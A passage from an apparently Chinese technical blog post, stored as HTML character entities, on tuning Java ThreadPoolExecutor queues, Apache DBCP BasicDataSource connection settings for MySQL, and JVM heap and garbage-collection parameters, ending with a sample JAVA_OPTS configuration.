keepAliveTime&#xFF1A;&#x7EBF;&#x7A0B;&#x4FDD;&#x6301;&#x6D3B;&#x52A8;&#x7684;&#x65F6;&#x95F4; workQueue&#xFF1A;&#x5DE5;&#x4F5C;&#x961F;&#x5217;&#xFF0C;&#x5B58;&#x653E;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1; Java&#x7EBF;&#x7A0B;&#x6C60;&#x9700;&#x8981;&#x4F20;&#x5165;&#x4E00;&#x4E2A;Queue&#x53C2;&#x6570;&#xFF08;workQueue&#xFF09;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x800C;&#x5BF9;Queue&#x7684;&#x4E0D;&#x540C;&#x9009;&#x62E9;&#xFF0C;&#x7EBF;&#x7A0B;&#x6C60;&#x6709;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#x7684;&#x884C;&#x4E3A;&#xFF1A; SynchronousQueue&#xFF1A; &#x4E00;&#x4E2A;&#x65E0;&#x5BB9;&#x91CF;&#x7684;&#x7B49;&#x5F85;&#x961F;&#x5217;&#xFF0C;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;insert&#x64CD;&#x4F5C;&#x5FC5;&#x987B;&#x7B49;&#x5F85;&#x53E6;&#x4E00;&#x7EBF;&#x7A0B;&#x7684;remove&#x64CD;&#x4F5C;&#xFF0C;&#x91C7;&#x7528;&#x8FD9;&#x4E2A;Queue&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x4F1A;&#x4E3A;&#x6BCF;&#x4E2A;&#x4EFB;&#x52A1;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x65B0;&#x7EBF;&#x7A0B; LinkedBlockingQueue &#xFF1A; &#x65E0;&#x754C;&#x961F;&#x5217;&#xFF0C;&#x91C7;&#x7528;&#x8BE5;Queue&#xFF0C;&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x5FFD;&#x7565; maximumPoolSize&#x53C2;&#x6570;&#xFF0C;&#x4EC5;&#x7528;corePoolSize&#x7684;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#x6240;&#x6709;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x672A;&#x5904;&#x7406;&#x7684;&#x4EFB;&#x52A1;&#x4FBF;&#x5728;LinkedBlockingQueue&#x4E2D;&#x6392;&#x961F; ArrayBlockingQueue&#xFF1A; &#x6709;&#x754C;&#x961F;&#x5217;&#xFF0C;&#x5728;&#x6709;&#x754C;&#x961F;&#x5217;&#x548C; maximumPoolSize&#x7684;&#x4F5C;&#x7528;&#x4E0B;&#xFF0C;&#x7A0B;&#x5E8F;&#x5C06;&#x5F88;&#x96BE;&#x88AB;&#x8C03;&#x4F18;&#xFF1A;&#x66F4;&#x5927;&#x7684;Queue&#x548C;&#x5C0F;&#x7684;maximumPoolSize&#x5C06;&#x5BFC;&#x81F4;CPU&#x7684;&#x4F4E;&#x8D1F;&#x8F7D;&#xFF1B;&#x5C0F;&#x7684;Queue&#x548C;&#x5927;&#x7684;&#x6C60;&#xFF0C;Queue&#x5C31;&#x6CA1;&#x8D77;&#x52A8;&#x5E94;&#x6709;&#x7684;&#x4F5C;&#x7528;&#x3002; &#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x7684;&#x8981;&#x6C42;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x5E0C;&#x671B;&#x7EBF;&#x7A0B;&#x6C60;&#x80FD;&#x8DDF;&#x8FDE;&#x63A5;&#x6C60;&#x4E00;&#x6837;&#xFF0C;&#x80FD;&#x8BBE;&#x7F6E;&#x6700;&#x5C0F;&#x7EBF;&#x7A0B;&#x6570;&#x3001;&#x6700;&#x5927;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5F53;&#x6700;&#x5C0F;&#x6570;&lt;&#x4EFB;&#x52A1;&lt;&#x6700;&#x5927;&#x6570;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x5206;&#x914D;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#xFF1B;&#x5F53;&#x4EFB;&#x52A1;&gt;&#x6700;&#x5927;&#x6570;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x7B49;&#x5F85;&#x6709;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#x518D;&#x5904;&#x7406;&#x8BE5;&#x4EFB;&#x52A1;&#x3002; &#x4F46;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#x662F;&#xFF0C;&#x4EFB;&#x52A1;&#x5E94;&#x8BE5;&#x653E;&#x5230;Queue&#x4E2D;&#xFF0C;&#x5F53;Queue&#x653E;&#x4E0D;&#x4E0B;&#x65F6;&#x518D;&#x8003;&#x8651;&#x7528;&#x65B0;&#x7EBF;&#x7A0B;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;Queue&#x6EE1;&#x4E14;&#x65E0;&#x6CD5;&#x6D3E;&#x751F;&#x65B0;&#x7EBF;&#x7A0B;&#xFF0C;&#x5C31;&#x62D2;&#x7EDD;&#x8BE5;&#x4EFB;&#x52A1;&#x3002;&#x8BBE;&#x8BA1;&#x5BFC;&#x81F4;&#x201C;&#x5148;&#x653E;&#x7B49;&#x6267;&#x884C;&#x201D;&#x3001;&#x201C;&#x653E;&#x4E0D;&#x4E0B;&#x518D;&#x6267;&#x884C;&#x201D;&#x3001;&#x201C;&#x62D2;&#x7EDD;&#x4E0D;&#x7B49;&#x5F85;&#x201D;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;Queue&#x53C2;&#x6570;&#xFF0C;&#x8981;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x4E0D;&#x80FD;&#x4E00;&#x5473;&#x5730;&#x589E;&#x5927;maximumPoolSize&#x3002; &#x5F53;&#x7136;&#xFF0C;&#x8981;&#x8FBE;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#xFF0C;&#x5FC5;&#x987B;&#x5BF9;&#x7EBF;&#x7A0B;&#x6C60;&#x8FDB;&#x884C;&#x4E00;&#x5B9A;&#x7684;&#x5C01;&#x88C5;&#xFF0C;&#x5E78;&#x8FD0;&#x7684;&#x662F;ThreadPoolExecutor&#x4E2D;&#x7559;&#x4E86;&#x8DB3;&#x591F;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x63A5;&#x53E3;&#x4EE5;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x8FBE;&#x5230;&#x76EE;&#x6807;&#x3002;&#x6211;&#x4EEC;&#x5C01;&#x88C5;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#xFF1A; &#x4EE5;SynchronousQueue&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x4F7F;maximumPoolSize&#x53D1;&#x6325;&#x4F5C;&#x7528;&#xFF0C;&#x4EE5;&#x9632;&#x6B62;&#x7EBF;&#x7A0B;&#x88AB;&#x65E0;&#x9650;&#x5236;&#x7684;&#x5206;&#x914D;&#xFF0C;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x9AD8;maximumPoolSize&#x6765;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x91CF; &#x81EA;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;RejectedExecutionHandler&#xFF0C;&#x5F53;&#x7EBF;&#x7A0B;&#x6570;&#x8D85;&#x8FC7;maximumPoolSize&#x65F6;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E3A;&#x9694;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x68C0;&#x67E5;&#x7EBF;&#x7A0B;&#x6C60;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x65B0;Task&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x628A;&#x62D2;&#x7EDD;&#x7684;Task&#x91CD;&#x65B0;&#x653E;&#x5165;&#x5230;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x68C0;&#x67E5;&#x7684;&#x65F6;&#x95F4;&#x4F9D;&#x8D56;keepAliveTime&#x7684;&#x5927;&#x5C0F;&#x3002; 2.&#x8FDE;&#x63A5;&#x6C60;&#xFF08;org.apache.commons.dbcp.BasicDataSource&#xFF09;&#x5728;&#x4F7F;&#x7528;org.apache.commons.dbcp.BasicDataSource&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x56E0;&#x4E3A;&#x4E4B;&#x524D;&#x91C7;&#x7528;&#x4E86;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x8BBF;&#x95EE;&#x91CF;&#x5927;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;JMX&#x89C2;&#x5BDF;&#x5230;&#x5F88;&#x591A;Tomcat&#x7EBF;&#x7A0B;&#x90FD;&#x963B;&#x585E;&#x5728;BasicDataSource&#x4F7F;&#x7528;&#x7684;Apache ObjectPool&#x7684;&#x9501;&#x4E0A;&#xFF0C;&#x76F4;&#x63A5;&#x539F;&#x56E0;&#x5F53;&#x65F6;&#x662F;&#x56E0;&#x4E3A;BasicDataSource&#x8FDE;&#x63A5;&#x6C60;&#x7684;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#x8BBE;&#x7F6E;&#x7684;&#x592A;&#x5C0F;&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;BasicDataSource&#x914D;&#x7F6E;&#xFF0C;&#x4EC5;&#x4F7F;&#x7528;8&#x4E2A;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x3002; &#x6211;&#x8FD8;&#x89C2;&#x5BDF;&#x5230;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5F53;&#x8F83;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BD4;&#x5982;2&#x5929;&#xFF0C;DB&#x4E0A;&#x7684;Mysql&#x4F1A;&#x65AD;&#x6389;&#x6240;&#x4EE5;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x5BFC;&#x81F4;&#x8FDE;&#x63A5;&#x6C60;&#x4E2D;&#x7F13;&#x5B58;&#x7684;&#x8FDE;&#x63A5;&#x4E0D;&#x80FD;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5145;&#x5206;&#x7814;&#x7A76;&#x4E86;BasicDataSource&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E9B;&#x4F18;&#x5316;&#x7684;&#x70B9;&#xFF1A; Mysql&#x9ED8;&#x8BA4;&#x652F;&#x6301;100&#x4E2A;&#x94FE;&#x63A5;&#xFF0C;&#x6240;&#x4EE5;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x6C60;&#x7684;&#x914D;&#x7F6E;&#x8981;&#x6839;&#x636E;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x673A;&#x5668;&#x6570;&#x8FDB;&#x884C;&#xFF0C;&#x5982;&#x6709;2&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EF;&#x6BCF;&#x4E2A;&#x8BBE;&#x7F6E;&#x4E3A;60 initialSize&#xFF1A;&#x53C2;&#x6570;&#x662F;&#x4E00;&#x76F4;&#x6253;&#x5F00;&#x7684;&#x8FDE;&#x63A5;&#x6570; minEvictableIdleTimeMillis&#xFF1A;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x7684;&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x5173;&#x95ED; timeBetweenEvictionRunsMillis&#xFF1A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#x7684;&#x8FD0;&#x884C;&#x5468;&#x671F;&#xFF0C;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x8FC7;&#x671F;&#x8FDE;&#x63A5; maxActive&#xFF1A;&#x6700;&#x5927;&#x80FD;&#x5206;&#x914D;&#x7684;&#x8FDE;&#x63A5;&#x6570; maxIdle&#xFF1A;&#x6700;&#x5927;&#x7A7A;&#x95F2;&#x6570;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x4F7F;&#x7528;&#x5B8C;&#x6BD5;&#x540E;&#x53D1;&#x73B0;&#x8FDE;&#x63A5;&#x6570;&#x5927;&#x4E8E;maxIdle&#xFF0C;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x76F4;&#x63A5;&#x5173;&#x95ED;&#x3002;&#x53EA;&#x6709;initialSize &lt; x &lt; maxIdle&#x7684;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x5B9A;&#x671F;&#x68C0;&#x6D4B;&#x662F;&#x5426;&#x8D85;&#x671F;&#x3002;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x5728;&#x5CF0;&#x503C;&#x8BBF;&#x95EE;&#x65F6;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x3002; initialSize&#x662F;&#x5982;&#x4F55;&#x4FDD;&#x6301;&#x7684;&#xFF1F;&#x7ECF;&#x8FC7;&#x7814;&#x7A76;&#x4EE3;&#x7801;&#x53D1;&#x73B0;&#xFF0C;BasicDataSource&#x4F1A;&#x5173;&#x95ED;&#x6240;&#x6709;&#x8D85;&#x671F;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6253;&#x5F00;initialSize&#x6570;&#x91CF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x4E0E;minEvictableIdleTimeMillis&#x3001;timeBetweenEvictionRunsMillis&#x4E00;&#x8D77;&#x4FDD;&#x8BC1;&#x4E86;&#x6240;&#x6709;&#x8D85;&#x671F;&#x7684;initialSize&#x8FDE;&#x63A5;&#x90FD;&#x4F1A;&#x88AB;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#xFF0C;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x4E86;Mysql&#x957F;&#x65F6;&#x95F4;&#x65E0;&#x52A8;&#x4F5C;&#x4F1A;&#x65AD;&#x6389;&#x8FDE;&#x63A5;&#x7684;&#x95EE;&#x9898;&#x3002; 3.JVM&#x53C2;&#x6570;&#x5728;JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8DDF;&#x5185;&#x5B58;&#x3001;&#x5783;&#x573E;&#x56DE;&#x6536;&#x76F8;&#x5173;&#x7684;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0D;&#x505A;&#x4EFB;&#x4F55;&#x8BBE;&#x7F6E;JVM&#x4F1A;&#x5DE5;&#x4F5C;&#x7684;&#x5F88;&#x597D;&#xFF0C;&#x4F46;&#x5BF9;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x5F88;&#x597D;&#x7684;Server&#x548C;&#x5177;&#x4F53;&#x7684;&#x5E94;&#x7528;&#x5FC5;&#x987B;&#x4ED4;&#x7EC6;&#x8C03;&#x4F18;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x6700;&#x4F73;&#x6027;&#x80FD;&#x3002;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x8FBE;&#x5230;&#x4E00;&#x4E9B;&#x76EE;&#x6807;&#xFF1A; GC&#x7684;&#x65F6;&#x95F4;&#x8DB3;&#x591F;&#x7684;&#x5C0F; GC&#x7684;&#x6B21;&#x6570;&#x8DB3;&#x591F;&#x7684;&#x5C11; &#x53D1;&#x751F;Full GC&#x7684;&#x5468;&#x671F;&#x8DB3;&#x591F;&#x7684;&#x957F; &#x524D;&#x4E24;&#x4E2A;&#x76EE;&#x524D;&#x662F;&#x76F8;&#x6096;&#x7684;&#xFF0C;&#x8981;&#x60F3;GC&#x65F6;&#x95F4;&#x5C0F;&#x5FC5;&#x987B;&#x8981;&#x4E00;&#x4E2A;&#x66F4;&#x5C0F;&#x7684;&#x5806;&#xFF0C;&#x8981;&#x4FDD;&#x8BC1;GC&#x6B21;&#x6570;&#x8DB3;&#x591F;&#x5C11;&#xFF0C;&#x5FC5;&#x987B;&#x4FDD;&#x8BC1;&#x4E00;&#x4E2A;&#x66F4;&#x5927;&#x7684;&#x5806;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x53D6;&#x5176;&#x5E73;&#x8861;&#x3002; &#x9488;&#x5BF9;JVM&#x5806;&#x7684;&#x8BBE;&#x7F6E;&#x4E00;&#x822C;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-Xms -Xmx&#x9650;&#x5B9A;&#x5176;&#x6700;&#x5C0F;&#x3001;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x5783;&#x573E;&#x6536;&#x96C6;&#x5668;&#x5728;&#x6700;&#x5C0F;&#x3001;&#x6700;&#x5927;&#x4E4B;&#x95F4;&#x6536;&#x7F29;&#x5806;&#x800C;&#x4EA7;&#x751F;&#x989D;&#x5916;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x628A;&#x6700;&#x5927;&#x3001;&#x6700;&#x5C0F;&#x8BBE;&#x7F6E;&#x4E3A;&#x76F8;&#x540C;&#x7684;&#x503C; &#x5E74;&#x8F7B;&#x4EE3;&#x548C;&#x5E74;&#x8001;&#x4EE3;&#x5C06;&#x6839;&#x636E;&#x9ED8;&#x8BA4;&#x7684;&#x6BD4;&#x4F8B;&#xFF08;1&#xFF1A;2&#xFF09;&#x5206;&#x914D;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x6574;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x6BD4;&#x7387;NewRadio&#x6765;&#x8C03;&#x6574;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x56DE;&#x6536;&#x4EE3;&#xFF0C;&#x6BD4;&#x5982;&#x5E74;&#x8F7B;&#x4EE3;&#xFF0C;&#x901A;&#x8FC7; -XX:newSize -XX:MaxNewSize&#x6765;&#x8BBE;&#x7F6E;&#x5176;&#x7EDD;&#x5BF9;&#x5927;&#x5C0F;&#x3002;&#x540C;&#x6837;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5806;&#x6536;&#x7F29;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x5E38;&#x4F1A;&#x628A;-XX:newSize -XX:MaxNewSize&#x8BBE;&#x7F6E;&#x4E3A;&#x540C;&#x6837;&#x5927;&#x5C0F; &#x5E74;&#x8F7B;&#x4EE3;&#x548C;&#x5E74;&#x8001;&#x4EE3;&#x8BBE;&#x7F6E;&#x591A;&#x5927;&#x624D;&#x7B97;&#x5408;&#x7406;&#xFF1F;&#x8FD9;&#x4E2A;&#x6211;&#x95EE;&#x9898;&#x6BEB;&#x65E0;&#x7591;&#x95EE;&#x662F;&#x6CA1;&#x6709;&#x7B54;&#x6848;&#x7684;&#xFF0C;&#x5426;&#x5219;&#x4E5F;&#x5C31;&#x4E0D;&#x4F1A;&#x6709;&#x8C03;&#x4F18;&#x3002;&#x6211;&#x4EEC;&#x89C2;&#x5BDF;&#x4E00;&#x4E0B;&#x4E8C;&#x8005;&#x5927;&#x5C0F;&#x53D8;&#x5316;&#x6709;&#x54EA;&#x4E9B;&#x5F71;&#x54CD;&#xFF1A;&#xFF08;1&#xFF09;&#x66F4;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x5FC5;&#x7136;&#x5BFC;&#x81F4;&#x66F4;&#x5C0F;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x4F1A;&#x5EF6;&#x957F;&#x666E;&#x901A;GC&#x7684;&#x5468;&#x671F;&#xFF0C;&#x4F46;&#x4F1A;&#x589E;&#x52A0;&#x6BCF;&#x6B21;GC&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x5C0F;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x5BFC;&#x81F4;&#x66F4;&#x9891;&#x7E41;&#x7684;Full GC&#x3002;&#xFF08;2&#xFF09;&#x66F4;&#x5C0F;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x5FC5;&#x7136;&#x5BFC;&#x81F4;&#x66F4;&#x5927;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x5C0F;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x4F1A;&#x5BFC;&#x81F4;&#x666E;&#x901A;GC&#x5F88;&#x9891;&#x7E41;&#xFF0C;&#x4F46;&#x6BCF;&#x6B21;&#x7684;GC&#x65F6;&#x95F4;&#x4F1A;&#x66F4;&#x77ED;&#xFF1B;&#x5927;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x51CF;&#x5C11;Full GC&#x7684;&#x9891;&#x7387;&#x3002;&#xFF08;3&#xFF09;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x5E94;&#x8BE5;&#x4F9D;&#x8D56;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BF9;&#x8C61;&#x751F;&#x547D;&#x5468;&#x671F;&#x7684;&#x5206;&#x5E03;&#x60C5;&#x51B5;&#xFF1A;&#x5982;&#x679C;&#x5E94;&#x7528;&#x5B58;&#x5728;&#x5927;&#x91CF;&#x7684;&#x4E34;&#x65F6;&#x5BF9;&#x8C61;&#xFF0C;&#x5E94;&#x8BE5;&#x9009;&#x62E9;&#x66F4;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#xFF1B;&#x5982;&#x679C;&#x5B58;&#x5728;&#x76F8;&#x5BF9;&#x8F83;&#x591A;&#x7684;&#x6301;&#x4E45;&#x5BF9;&#x8C61;&#xFF0C;&#x5E74;&#x8001;&#x4EE3;&#x5E94;&#x8BE5;&#x9002;&#x5F53;&#x589E;&#x5927;&#x3002;&#x4F46;&#x5F88;&#x591A;&#x5E94;&#x7528;&#x90FD;&#x6CA1;&#x6709;&#x8FD9;&#x6837;&#x660E;&#x663E;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x5728;&#x6289;&#x62E9;&#x65F6;&#x5E94;&#x8BE5;&#x6839;&#x636E;&#x4EE5;&#x4E0B;&#x4E24;&#x70B9;&#xFF1A;&#xFF08;A&#xFF09;&#x672C;&#x7740;Full GC&#x5C3D;&#x91CF;&#x5C11;&#x7684;&#x539F;&#x5219;&#xFF0C;&#x8BA9;&#x5E74;&#x8001;&#x4EE3;&#x5C3D;&#x91CF;&#x7F13;&#x5B58;&#x5E38;&#x7528;&#x5BF9;&#x8C61;&#xFF0C;JVM&#x7684;&#x9ED8;&#x8BA4;&#x6BD4;&#x4F8B;1&#xFF1A;2&#x4E5F;&#x662F;&#x8FD9;&#x4E2A;&#x9053;&#x7406;&#xFF08;B&#xFF09;&#x901A;&#x8FC7;&#x89C2;&#x5BDF;&#x5E94;&#x7528;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#xFF0C;&#x770B;&#x5176;&#x4ED6;&#x5728;&#x5CF0;&#x503C;&#x65F6;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x5360;&#x591A;&#x5C11;&#x5185;&#x5B58;&#xFF0C;&#x5728;&#x4E0D;&#x5F71;&#x54CD;Full GC&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x52A0;&#x5927;&#x5E74;&#x8F7B;&#x4EE3;&#xFF0C;&#x6BD4;&#x5982;&#x53EF;&#x4EE5;&#x628A;&#x6BD4;&#x4F8B;&#x63A7;&#x5236;&#x5728;1&#xFF1A;1&#x3002;&#x4F46;&#x5E94;&#x8BE5;&#x7ED9;&#x5E74;&#x8001;&#x4EE3;&#x81F3;&#x5C11;&#x9884;&#x7559;1/3&#x7684;&#x589E;&#x957F;&#x7A7A;&#x95F4; &#x5728;&#x914D;&#x7F6E;&#x8F83;&#x597D;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF08;&#x6BD4;&#x5982;&#x591A;&#x6838;&#x3001;&#x5927;&#x5185;&#x5B58;&#xFF09;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x5E74;&#x8001;&#x4EE3;&#x9009;&#x62E9;&#x5E76;&#x884C;&#x6536;&#x96C6;&#x7B97;&#x6CD5;&#xFF1A; -XX:+UseParallelOldGC &#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;Serial&#x6536;&#x96C6; &#x7EBF;&#x7A0B;&#x5806;&#x6808;&#x7684;&#x8BBE;&#x7F6E;&#xFF1A;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x9ED8;&#x8BA4;&#x4F1A;&#x5F00;&#x542F;1M&#x7684;&#x5806;&#x6808;&#xFF0C;&#x7528;&#x4E8E;&#x5B58;&#x653E;&#x6808;&#x5E27;&#x3001;&#x8C03;&#x7528;&#x53C2;&#x6570;&#x3001;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x7B49;&#xFF0C;&#x5BF9;&#x5927;&#x591A;&#x6570;&#x5E94;&#x7528;&#x800C;&#x8A00;&#x8FD9;&#x4E2A;&#x9ED8;&#x8BA4;&#x503C;&#x592A;&#x4E86;&#xFF0C;&#x4E00;&#x822C;256K&#x5C31;&#x8DB3;&#x7528;&#x3002;&#x7406;&#x8BBA;&#x4E0A;&#xFF0C;&#x5728;&#x5185;&#x5B58;&#x4E0D;&#x53D8;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x51CF;&#x5C11;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5806;&#x6808;&#xFF0C;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x66F4;&#x591A;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x4F46;&#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x8FD8;&#x53D7;&#x9650;&#x4E8E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3002; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x53C2;&#x6570;&#x6253;Heap Dump&#x4FE1;&#x606F;&#xFF08;1&#xFF09;-XX:HeapDumpPath&#xFF08;2&#xFF09;-XX:+PrintGCDetails&#xFF08;3&#xFF09;-XX:+PrintGCTimeStamps&#xFF08;4&#xFF09;-Xloggc:/usr/aaa/dump/heap_trace.txt &#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x63A7;&#x5236;OutOfMemoryError&#x65F6;&#x6253;&#x5370;&#x5806;&#x7684;&#x4FE1;&#x606F;-XX:+HeapDumpOnOutOfMemoryError &#x8BF7;&#x770B;&#x4E00;&#x4E0B;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x7684;Java&#x53C2;&#x6570;&#x914D;&#x7F6E;&#xFF1A;&#xFF08;&#x670D;&#x52A1;&#x5668;&#xFF1A;Linux 64Bit&#xFF0C;8Core&#xD7;16G&#xFF09; JAVA_OPTS=&#x201D;$JAVA_OPTS -server -Xms3G -Xmx3G -Xss256k -XX:PermSize=128m -XX:MaxPermSize=128m -XX:+UseParallelOldGC -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/usr/aaa/dump -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -Xloggc:/usr/aaa/dump/heap_trace.txt -XX:NewSize=1G -XX:MaxNewSize=1G&#x201D; &#x7ECF;&#x8FC7;&#x89C2;&#x5BDF;&#x8BE5;&#x914D;&#x7F6E;&#x975E;&#x5E38;&#x7A33;&#x5B9A;&#xFF0C;&#x6BCF;&#x6B21;&#x666E;&#x901A;GC&#x7684;&#x65F6;&#x95F4;&#x5728;10ms&#x5DE6;&#x53F3;&#xFF0C;Full GC&#x57FA;&#x672C;&#x4E0D;&#x53D1;&#x751F;&#xFF0C;&#x6216;&#x9694;&#x5F88;&#x957F;&#x5F88;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x624D;&#x53D1;&#x751F;&#x4E00;&#x6B21; 